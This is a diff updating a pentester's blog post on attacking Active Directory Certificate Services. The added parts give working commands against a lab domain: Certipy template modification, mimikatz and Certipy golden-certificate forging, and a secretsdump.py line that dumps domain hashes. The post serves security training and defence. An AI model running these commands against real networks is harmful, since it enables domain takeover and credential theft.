@@ -4,7 +4,7 @@ title: Skidaddle Skideldi - I just pwnd your PKI
 ---
 My dear Bagginses and Boffins, Tooks and Brandybucks, Grubbs, Chubbs, Hornblowers, Bolgers, Bracegirdles and Proudfoots - it is time for some new shit.  
 We are going to explore the wonderful world of Active Directory Certificate Services, aka ADCS.  
-If you want to leave an impression on your next pentest, this one's for you, as Microsoft's PKI implementation is widely used but little understood (well at least in terms to security).  
+If you want to leave an impression on your next pentest, this one's for you, as Microsoft's PKI implementation is widely used but little understood (well at least in terms of security).  
 Same is true if you live on the blue side, as you can proactively mitigate issues an earn some bonus points with your boss, maybe.  
 Prepare yourself for a shitload of pictures, memes, usefull as well as meaningless information.  
    
@@ -235,7 +235,9 @@ No matter how often I red through all the stuff I found regarding ESC2, I can't 
 It describes the case, where there is either the ``Any purpose`` SKU set, or no SKU at all (which would be called a SubCA cert), which utlimately would allow the cert to be used for anything we like. Also low priv users need enrollment rights and no manager approval is in place.  
 It is however not abusable like ESC1, if we can't specifiy the SAN.  
 A cert with no SKU could additionally be used to sign other certs. Unfortunately these can't be used for domain auth by default, as the ``NTAuthCertificates``(see p. 14 of the whitepaper) object won't trust them.  
-So the abuse cases are not clear to me. We might stumble upon a cert in a forgotten folder of some other user, maybe. But we are not able to request them. The thing that comes to my mind is relaying, and that might actually work.  
+~~So the abuse cases are not clear to me. We might stumble upon a cert in a forgotten folder of some other user, maybe. But we are not able to request them. The thing that comes to my mind is relaying, and that might actually work.~~  
+UPDATE:  After releasing the blog, Oliver reached out to me and helped me at quite some topics regarding ADCS. In this case you can abuse ESC2 exactly like [ESC3](#esc3), if the templates you want to target are ``Schema Version 1``, which is true for all the default templates (like ``Doman Controller``, ``Client``, ``Computer`` and so on).   
+
 
 Will and Lee at least gave us a tip on how to search for them.
 ```
@@ -357,7 +359,7 @@ certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -dc-ip '10.55.0.2' -stdout -v
 
 ### Exploitation
 
-Well in this case we can't work with Certify or Certipy alone, because we need to alter the AD object / cert template. For this reason we are going to use [Will's](https://twitter.com/harmj0y) [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) or [Fortalice Solutions's](https://fortalicesolutions.com/) [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) respectively.
+Well in this case we can't work with Certify ~~or Certipy~~ (see below update) alone, because we need to alter the AD object / cert template. For this reason we are going to use [Will's](https://twitter.com/harmj0y) [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) or [Fortalice Solutions's](https://fortalicesolutions.com/) [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) respectively.
 
 #### PowerView & Certify
 ```
@@ -397,22 +399,85 @@ Before and after altering the cert template:
 ```
 certipy req -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1' -template 'ESC4' -upn 'Administrator@mcafeelab.local'
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.55.0.2' -username 'Administrator' -domain 'mcafeelab.local'
-secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local'
+secretsdump.py -just-dc -hashes 'aad3b435b514...:...f7207931' 'mcafeelab.local/Administrator@dc2016-2.mcafeelab.local'  
 ```
+
+UPDATE: Well, again I was wrong, and Oliver added a standalone approach:  
+```
+certipy template -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -template 'ESC4_1'
+```
+
+<img src="/images/2022-09-16/ESC4_exploit99.png">  
+
+This will make the template vulnerable to [ESC1](#esc1)  
+Before and after Certipy pwnage:  
+
+<img src="/images/2022-09-16/ESC4_exploit100.png">   
+
+If you are on an engeagement, you might want to use the ``-safe-old`` switch to save the before-version and preserve teh ability to roll back the settings, once you have abused the template.  
+More on this on Oliver`s [blog](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6).  
 
 ## ESC5
 
 This case describes all other possible scenarios around ACLs. Which might include:  
 
-- Pwning the CA server itself to tamper around with templates and stuff  
+- Pwning the CA server itself to tamper around with templates and stuff, through maybe RBCD attack or a direct way like local admin    
 - ACLs wrongly set somewhere up the line in AD - maybe where some set descendant rights somewhere in the config tree  
 - The CA server’s RPC/DCOM server  
 - ...  
 
 <img src="/images/2022-09-16/esc5_1.png"> 
 
-There is no direct abuse path, but you can use the before mentioned stuff as a guideline on how to proceed if this stuff here happens.  
+~~There is no direct abuse path, but you can use the before mentioned stuff as a guideline on how to proceed if this stuff here happens.~~  
+UPDATE: Shortly after my release I stumbled upon [n00py's](https://twitter.com/n00py1) tweet about ways to abuse a pwnd PKI server: [https://twitter.com/n00py1/status/1574423470640873472](https://twitter.com/n00py1/status/1574423470640873472).  
+The answer to success was the golden cert attack, which is described here: [https://pentestlab.blog/2021/11/15/golden-certificate/](https://pentestlab.blog/2021/11/15/golden-certificate/).  
+So if we pwn a PKI server (local admin is sufficient) we can forge a cert for everyone we like - even offline, like it is done with the golden ticket attack for Kerberos.  
 
+### Exploitation  
+
+#### GUI style with mimikatz  
+
+We can use Mimikatz to forge certs directly on the CA server for any user for us if we are local admin:  
+
+```
+crypto::scauth /caname:mcafeelab-DC2016-2-CA-1 /upn:Administrator@mcafeelab.local
+```  
+
+<img src="/images/2022-09-16/esc5_exploit.png">  
+
+Afterwards we can export the cert and use it to authenticate like described in e.g. [ESC1](#esc1).  
+
+We can alternatively export the CAs cert and key manually.  
+RDP to the server as admin, open ``certsrv.msc`` and trigger the ``Backup up CA`` function:  
+
+<img src="/images/2022-09-16/esc5_exploit1.png">  
+
+Select to export the private key and CA cert, to fetch the according ``p12`` file:  
+
+<img src="/images/2022-09-16/esc5_exploit2.png">  
+
+You can now use tools like [ForgeCert](https://github.com/GhostPack/ForgeCert) or Certipy to go on.
+
+#### Certipy
+
+As for mostly all cases, Oliver automated the abuse capability in Certipy. If you owned a user which is admin on the CA just do:  
+
+Backup the CA cert  
+```
+certipy ca -backup -u 'localadmin' -p 'test' -target 'dc2016-2.mcafeelab.local' -ca 'mcafeelab-DC2016-2-CA-1'
+```  
+
+Forge a cert to whom we want to:  
+```
+certipy forge -ca-pfx mcafeelab-DC2016-2-CA-1.pfx -upn god@mcafeelab.local -subject 'CN=god,CN=Users,DC=mcafeelab,DC=local'
+```
+
+And authenticate as that user:  
+```
+certipy auth -pfx 'god_forged.pfx' -dc-ip '10.55.0.2'
+```
+
+<img src="/images/2022-09-16/esc5_exploit3.png"> 
 
 ## ESC6  
 
@@ -851,6 +916,22 @@ The cool thing about certs is that by default they have a lifetime of 1 year. So
 
 https://twitter.com/theluemmel/status/1572478359619211266  
 
+### Bloodhound integration  
+
+Again a cool feature from Certipy. You can export the findings of Certipy to Bloodhound with the ``-old-bloodhound`` switch:  
+
+```
+certipy find -u 'lowpriv@mcafeelab.local' -p 'low' -target 'dc2016-2.mcafeelab.local' -old-bloodhound
+```
+
+<img src="/images/2022-09-16/bonus_bh1.png">    
+
+We can then e.g. look for attacks paths for some of the ESC examples like ESC6 after importing Oliver's [custom queries](https://github.com/ly4k/Certipy/blob/main/customqueries.json) for Bloodhound:  
+
+<img src="/images/2022-09-16/bonus_bh2.png">    
+
+If you use Oliver's [fork](https://github.com/ly4k/BloodHound/) of Bloodhound, you can even find more ways for privesc via certs. Go read his [blog](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6#ESC4%20—%20Vulnerable%20Certificate%20Template%20Access%20Control).  
+
 # Remediation  
 
 Generally speaking, check your PKI infrastructure and use the tools and tips provided. Update regularly. Challenge regularly.    
@@ -886,7 +967,8 @@ https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
 https://posts.specterops.io/certified-pre-owned-d95910965cd2  
 ESC4: https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates  
 https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7  
-https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4  
+https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4   
+https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6  
 https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services  
 https://github.com/bats3c/ADCSPwn  
 https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate  
